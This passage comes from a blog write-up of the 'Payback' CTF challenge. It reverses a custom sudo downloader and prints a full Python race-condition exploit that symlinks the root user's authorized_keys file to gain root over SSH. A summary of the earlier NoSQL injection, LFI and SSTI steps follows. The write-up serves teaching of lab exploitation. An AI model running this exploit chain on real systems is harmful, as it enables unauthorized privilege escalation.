<p>Apart from the source files of the <em>QuotesRank</em> web app, nothing of much interest was found in the home dir of <code class="language-plaintext highlighter-rouge">agent47</code>. Checking for SUDO showed that the user has sudo rights on what seems to be a custom binary;</p>

<p><img data-src="/assets/img/Pasted image 20230628213401.png" alt="" data-proofer-ignore></p>

<p>So I copied this over to my box for analysis. The binary seems to be a simple utility for downloading files from a given URL. The program uses the CURL library (<code class="language-plaintext highlighter-rouge">libcurl</code>) for making web requests;</p>

<p><img data-src="/assets/img/Pasted image 20230628213833.png" alt="" data-proofer-ignore></p>

<p>The IDA decompiler (shortcut: <code class="language-plaintext highlighter-rouge">F5</code>) did a very good job of reversing the binary. Going through the code, the program accepts 2 arguments as shown in the usage message: the first one being the URL, and the second one being the output file to write to. It then proceed to take the basename of the output file given using the <code class="language-plaintext highlighter-rouge">basename()</code> function provided in <code class="language-plaintext highlighter-rouge">libgen.h</code> (likely to prevent path traversal) and append it to the string <code class="language-plaintext highlighter-rouge">/opt/downloads/</code>. It then checks if the new path generated exists by trying to open it for read. If it succeed, it indicates the file exists, and the program exits with code <code class="language-plaintext highlighter-rouge">2</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628214755.png" alt="" data-proofer-ignore></p>

<p>This indicates the program does not want us to overwrite existing files during download. It then proceeds to create a custom buffer and calls <code class="language-plaintext highlighter-rouge">http_get()</code> with the URL and buffer as arguments. The <code class="language-plaintext highlighter-rouge">http_get()</code> function is what handles the actual file download. It uses CURL and writes the complete body of the HTTP response to the given buffer (with the aid of the function <code class="language-plaintext highlighter-rouge">body_receiver()</code>);</p>

<p><img data-src="/assets/img/Pasted image 20230628215411.png" alt="" data-proofer-ignore></p>

<p>Once the <code class="language-plaintext highlighter-rouge">http_get()</code> function finished the download, it returns, and the <code class="language-plaintext highlighter-rouge">main()</code> function writes the contents of the buffer to the output file;</p>

<p><img data-src="/assets/img/Pasted image 20230628215540.png" alt="" data-proofer-ignore></p>

<p>Notice that the file is opened for writing only after the HTTP request has been completed, which takes time. Since the program does not perform another check to make sure the requested output file does not exist this time, this creates a <em>race condition</em> vulnerability.</p>

<p>An interesting way to exploit this vulnerability is using <em>symbolic links</em>, which are special files that point other files, acting like some sort of proxy. If we can get the program to write to a symlink that points to a critical file on the system, we may be able to write arbitrary data to any file on the system since we are running <code class="language-plaintext highlighter-rouge">dloader</code> as root. The major obstacle to this is that all downloads are saved to <code class="language-plaintext highlighter-rouge">/opt/downlaods/</code>. However, this directory is owned by <em>root</em> and belongs to the group <em>devs</em>, which is interesting because the user <code class="language-plaintext highlighter-rouge">agent47</code> also belongs to that group;</p>

<p><img data-src="/assets/img/Pasted image 20230628220644.png" alt="" data-proofer-ignore></p>

<p>Thanks to the group permission, we can now write to the <code class="language-plaintext highlighter-rouge">/opt/downloads</code> directory. After a couple of tests, I was able to develop a PoC that exploits the <em>race condition</em> to overwrite the SSH key of the root user;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
#--------------------------------------------------------------------------------
#   An exploit for the race condition affecting `dloader` for the privesc part of
# Payback (Web) - OdysseyCTF (agent47 =&gt; root)
#   It exploits the race condition to add the public part of an SSH key to the 
# 'authorized_keys' file of the root user. 
# Killchain;
# 1. Creates a public and private SSH key pair.
# 2. Creates a simple socket server to serve the public key for download.
# 3. Once a request is received for the public key, it indicates the file check
# has already been performed, so the program exploits the race condition by crea-
# ing a dangling symbolic link to '/root/.ssh/authorized_keys'
# 4. The exploit then sends the public key contents, which the dloader executable
# writes to the symbolic link.
# 5. The program then uses the private key created earlier to authenticate.  
#                                                                 Author: 4g3nt47
#--------------------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">random</span>

<span class="c1"># For generating random alpha-numeric strings.
</span><span class="k">def</span> <span class="nf">randstr</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
  <span class="n">rstr</span> <span class="o">=</span> <span class="s">""</span>
  <span class="n">chars</span> <span class="o">=</span> <span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>
  <span class="k">while</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mi">1</span>
    <span class="n">rstr</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)]</span>
  <span class="k">return</span> <span class="n">rstr</span>

<span class="c1"># Where the magic happens...
</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
  <span class="n">password</span> <span class="o">=</span> <span class="s">"angle0164363985"</span> <span class="c1"># agent47's password required for using 'sudo'
</span>  <span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">"/dev/shm"</span><span class="p">)</span>         <span class="c1"># A writable dir for writing temporary files.
</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating SSH keys..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh-keygen -N '' -f exploit.key"</span><span class="p">)</span> <span class="c1"># Creates exploit.key and exlpoit.key.pub
</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Starting server..."</span><span class="p">)</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
  <span class="n">s</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
  <span class="n">port</span> <span class="o">=</span> <span class="mi">4747</span>
  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Server started!"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Executing 'sudo /usr/bin/dloader'..."</span><span class="p">)</span>
  <span class="n">outfile</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"echo %s | sudo -S /usr/bin/dloader http://127.0.0.1:%d %s &amp;"</span> <span class="o">%</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">outfile</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Waiting for request..."</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Client connected: %s..."</span> <span class="o">%</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating dangling symlink to '/root/.ssh/authorized_keys'..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ln -s /root/.ssh/authorized_keys /opt/downloads/%s"</span> <span class="o">%</span><span class="p">(</span><span class="n">outfile</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Sending public key..."</span><span class="p">)</span>
  <span class="n">pubkey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
  <span class="n">rsp</span> <span class="o">=</span> <span class="s">"HTTP/1.0 200 OK</span><span class="se">\r\n</span><span class="s">Server: SimpleHTTP/0.6 Python/3.7.3</span><span class="se">\r\n</span><span class="s">Content-type: text/plain; charset=utf-8</span><span class="se">\r\n</span><span class="s">Content-Length: %d</span><span class="se">\r\n\r\n</span><span class="s">"</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pubkey</span><span class="p">))</span>
  <span class="n">rsp</span> <span class="o">+=</span> <span class="n">pubkey</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">rsp</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Attempting SSH login as root..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh -i exploit.key root@127.0.0.1"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cleanup..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key"</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"/opt/downloads/"</span> <span class="o">+</span> <span class="n">outfile</span><span class="p">)</span>
  <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="n">exploit</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It worked, and I was able to login as <code class="language-plaintext highlighter-rouge">root</code> and get the flag :)</p>

<p><img data-src="/assets/img/Pasted image 20230628221209.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/Pasted image 20230628221242.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h4 id="summary">Summary<a href="#summary" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Challenge exposes port 20022 (OpenSSH) and 20080 (Nginx)</li>
  <li>Nginx homepage links to <code class="language-plaintext highlighter-rouge">exa.payback.local:20080</code>;
    <ul>
      <li>Web app has a registration form, but an “activation code” is required to complete registration.</li>
      <li>The code validation is vulnerable to <em>NoSQL Injection</em>, making it possible to bypass the check.</li>
      <li>Profile page has password reset feature handled by <code class="language-plaintext highlighter-rouge">/user/profile</code> route.</li>
      <li>The implementation is vulnerable to <em>mass assignment</em> vulnerability that allows privesc to site administrator.</li>
      <li>Administrator has access to the “Export Questions” feature in course management page, which is vulnerable to LFI, and can be used to load the SSH key of a local user named <code class="language-plaintext highlighter-rouge">exa</code> at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">exa</code>;
    <ul>
      <li>A credential for a user named <code class="language-plaintext highlighter-rouge">admin</code> was found in <code class="language-plaintext highlighter-rouge">.dbshell</code>, which is the history file of MongoDB client.</li>
      <li><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/payback</code> showed that another VHOST exists locally, with the hidden server listening on port <code class="language-plaintext highlighter-rouge">3000</code>.</li>
      <li>Setup an SSH tunnel to port <code class="language-plaintext highlighter-rouge">3000</code> for access from my box, and the credential found in <code class="language-plaintext highlighter-rouge">.dbshell</code> worked for the web application.</li>
      <li>Quote preview feature is vulnerable to SSTI (EJS), which I exploited to leak <code class="language-plaintext highlighter-rouge">process.env</code> and obtain DB creds.</li>
      <li>DB creds gave me access to the backend DB, and recovered a hash for a user account named <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
      <li>Hash was cracked successfully using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, and worked for the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">agent47</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">sudo -l</code> showed SUDO perms to <code class="language-plaintext highlighter-rouge">/usr/bin/dloader</code>, which is a custom HTTP downloader.</li>
      <li><code class="language-plaintext highlighter-rouge">dloader</code> attempts to prevent us from writing to existing files, but it has a <em>race condition</em> vulnerability.</li>
      <li>Exploited the program to overwrite the SSH key of the <em>root</em> user, which allowed me to login and get the flag at <code class="language-plaintext highlighter-rouge">/root/flag.txt</code></li>
    </ul>
  </li>
</ul>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories --><div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/ctf/'>ctf</a></div><!-- tags --><div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/ctf/"
          class="post-tag no-text-decoration" >ctf</a><a href="/tags/web/"
          class="post-tag no-text-decoration" >web</a><a href="/tags/express/"
          class="post-tag no-text-decoration" >express</a><a href="/tags/svelte/"
          class="post-tag no-text-decoration" >svelte</a><a href="/tags/nodejs/"
          class="post-tag no-text-decoration" >nodejs</a><a href="/tags/nosql-injection/"
          class="post-tag no-text-decoration" >NoSQL injection</a><a href="/tags/mongodb/"
          class="post-tag no-text-decoration" >mongodb</a><a href="/tags/mass-assignment/"
          class="post-tag no-text-decoration" >mass assignment</a><a href="/tags/lfi/"
          class="post-tag no-text-decoration" >lfi</a><a href="/tags/ssh/"
          class="post-tag no-text-decoration" >ssh</a><a href="/tags/tunneling/"
          class="post-tag no-text-decoration" >tunneling</a><a href="/tags/ssti/"
          class="post-tag no-text-decoration" >ssti</a><a href="/tags/ejs/"
          class="post-tag no-text-decoration" >ejs</a><a href="/tags/race-condition/"
          class="post-tag no-text-decoration" >race condition</a><a href="/tags/libcurl/"
          class="post-tag no-text-decoration" >libcurl</a></div><div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a> by the author.</div><!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Payback - OdysseyCTF - 4g3nt47&url=https://4g3nt47.github.io/posts/ctf/payback.html" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Payback - OdysseyCTF - 4g3nt47&u=https://4g3nt47.github.io/posts/ctf/payback.html" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a><a href="https://telegram.me/share?text=Payback - OdysseyCTF - 4g3nt47&url=https://4g3nt47.github.io/posts/ctf/payback.html" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a><i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>
</div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

</div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access"><!--<div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/rce/">rce</a></div>
  </div>-->
    </div></div>

</div>

<!-- tail --><div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  --><!-- An random integer that bigger than 0  --><!-- Equals to TAG_SCORE / {max_categories_hierarchy}  --><!-- Fill with the other newlest posts  --><div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4"><div class="card">
        <a href="/posts/hackthebox/cyberapoc_23.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2023-03-23 00:00:00 +0100">Mar 23</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Apocalypse 2023 - HackTheBox</h3>
            <div class="text-muted small">
              <p>Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges tha...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/agile.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2023-08-05 00:00:00 +0100">Aug  5</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Agile - HackTheBox</h3>
            <div class="text-muted small">
              <p>Agile is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the Werkzeug debug console. Once on the box, you’ll recover some creds from a MyS...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/redpanda.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-11-26 00:00:00 +0100">Nov 26, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>RedPanda - HackTheBox</h3>
            <div class="text-muted small">
              <p>RedPanda is a very easy linux box. It starts with a web service that’s vulnerable to Server-side Template Injection (SSTI) using Thymeleaf to gain RCE. Privesc involves exploiting two (2) path path...
              </p>
            </div>
          </div>
        </a>
      </div></div> <!-- .card-deck -->
  </div> <!-- #related-posts --><!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between"><a href="/posts/hackthebox/precious.html" class="btn btn-outline-primary"
    prompt="Older">
    <p>Precious - HackTheBox</p>
  </a><a href="/posts/hackthebox/agile.html" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Agile - HackTheBox</p>
  </a></div>
<!--  The comments switcher --></div>
  </div>
</div> <!-- .row --><!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/UmarAbdoul">Umar Abdul</a>.<span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p>
    </div>

    <div class="footer-right">
      <p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>
</div><!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints"><div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/rce/">rce</a></div>
  </div></div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>
</div> <!-- #main-wrapper --><div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a><!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
--><script src="/assets/js/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>
<!--
  JS selector for site.
-->

<!-- layout specified --><!-- image lazy-loading & popup -->
  <script src="/assets/js/clipboard.min.js"></script><script defer src="/assets/js/dist/post.min.js"></script><!-- commons -->

<script src="/assets/js/bootstrap.min.js"></script></body>

</html>
